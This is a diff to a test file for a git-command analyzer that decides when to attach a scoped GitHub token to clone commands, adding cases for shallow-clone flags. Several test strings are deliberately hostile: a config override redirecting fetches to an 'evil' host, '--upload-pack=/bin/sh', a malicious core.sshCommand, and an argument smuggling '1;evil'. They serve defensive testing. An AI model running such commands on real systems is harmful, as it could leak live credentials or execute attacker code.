@@ -127,6 +127,62 @@ describe('analyzeGitCommand — pass-through', () => {
   })
 })
 
+describe('analyzeGitCommand — clone flags', () => {
+  // A shallow, branch-limited clone is the ordinary shape for code analysis on a
+  // large repo. Without a credential it fails on a private repo with git's opaque
+  // "could not read Username", which names neither the policy nor a way forward.
+  test.each([
+    'git clone --depth 1 https://github.com/acme/widgets.git /tmp/w',
+    'git clone --depth=1 https://github.com/acme/widgets.git',
+    'git clone -b main --depth 1 https://github.com/acme/widgets.git /tmp/w',
+    'git clone --single-branch --no-tags --depth 1 https://github.com/acme/widgets.git /tmp/w',
+    'git clone --filter=blob:none https://github.com/acme/widgets.git /tmp/w',
+    'git clone -q --no-checkout https://github.com/acme/widgets.git /tmp/w',
+  ])('mints for an inert clone flag: %s', async (command) => {
+    expect(await analyze(command)).toMatchObject({ kind: 'inject', repoSlug: 'acme/widgets', access: 'read' })
+  })
+
+  // Each of these can redirect the fetch to another repo/host, execute a command, or
+  // read/write an arbitrary path while a scoped token is live. They must never mint.
+  test.each([
+    'git clone --recurse-submodules https://github.com/acme/widgets.git /tmp/w',
+    'git clone -c url.https://evil/.insteadOf=https://github.com/ https://github.com/acme/widgets.git /tmp/w',
+    'git clone --upload-pack=/bin/sh https://github.com/acme/widgets.git /tmp/w',
+    'git clone --separate-git-dir=/tmp/evil https://github.com/acme/widgets.git /tmp/w',
+    'git clone --template=/tmp/t https://github.com/acme/widgets.git /tmp/w',
+    'git clone --reference /tmp/other https://github.com/acme/widgets.git /tmp/w',
+  ])('refuses to mint for a redirecting or path-touching clone flag: %s', async (command) => {
+    expect((await analyze(command)).kind).toBe('pass-through')
+  })
+
+  test.each([
+    'git clone --depth 1 https://github.com/acme/widgets.git /tmp/w && rg reward /tmp/w',
+    'git clone --depth 1 -b main https://github.com/acme/widgets.git /tmp/w && ls /tmp/w',
+    'git clone --single-branch --no-tags --depth 1 https://github.com/acme/widgets.git /tmp/w && grep -rn x /tmp/w',
+  ])('mints for clone-then-inspect with inert flags: %s', async (command) => {
+    const decision = await analyze(command)
+    expect(decision).toMatchObject({ kind: 'inject', repoSlug: 'acme/widgets', access: 'read' })
+  })
+
+  test('rebuilds the clone-then-inspect head canonically with every token quoted', async () => {
+    const decision = await analyze('git clone --depth 1 https://github.com/acme/widgets.git /tmp/w && rg reward /tmp/w')
+    expect(decision.kind).toBe('inject')
+    if (decision.kind !== 'inject') return
+    expect(decision.rewrittenCommand?.split(' && ')[0]).toBe(
+      "/usr/bin/git clone '--depth' '1' 'https://github.com/acme/widgets.git' '/tmp/w'",
+    )
+  })
+
+  test.each([
+    "git clone --depth '1;evil' https://github.com/acme/widgets.git /tmp/w && ls /tmp/w",
+    'git clone --upload-pack=/bin/sh https://github.com/acme/widgets.git /tmp/w && ls /tmp/w',
+    'git clone -c core.sshCommand=evil https://github.com/acme/widgets.git /tmp/w && ls /tmp/w',
+    'git clone --recurse-submodules https://github.com/acme/widgets.git /tmp/w && ls /tmp/w',
+  ])('refuses clone-then-inspect for an unsafe flag or value: %s', async (command) => {
+    expect((await analyze(command)).kind).not.toBe('inject')
+  })
+})
+
 describe('analyzeGitCommand — inject (explicit url)', () => {
   test('clone https', async () => {
     expect(await analyze('git clone https://github.com/acme/widgets.git')).toEqual({
@@ -1001,9 +1057,20 @@ describe('analyzeGitCommand — clone-then-inspect (sanitized re-exec)', () => {
     expect((await analyze(cmd, ghRemote)).kind).not.toBe('inject')
   })
 
-  test('a strict-grammar head with flags is not rewritten (no-flags grammar avoids clone --config)', async () => {
+  // The head grammar admits flags only from the inert allowlist. `--config`/`-c` is
+  // the threat the original no-flags rule existed to stop (it can set url.insteadOf
+  // or core.sshCommand while the token is live) and stays refused; a blanket no-flags
+  // rule also refused `--depth`, which broke shallow clone for code analysis.
+  test.each([
+    'git clone --config core.sshCommand=evil https://github.com/acme/widgets.git /tmp/x && ls',
+    'git clone -c url.https://evil/.insteadOf=https://github.com/ https://github.com/acme/widgets.git /tmp/x && ls',
+  ])('a clone --config head is still never rewritten: %s', async (cmd) => {
+    expect((await analyze(cmd, ghRemote)).kind).not.toBe('inject')
+  })
+
+  test('an inert flag IS accepted by the strict head grammar', async () => {
     const result = await analyze('git clone --depth 1 https://github.com/acme/widgets.git /tmp/x && ls', ghRemote)
-    expect(result.kind).not.toBe('inject')
+    expect(result).toMatchObject({ kind: 'inject', repoSlug: 'acme/widgets', access: 'read' })
   })
 
   test('a url with embedded credentials/port is not accepted by the strict head grammar', async () => {
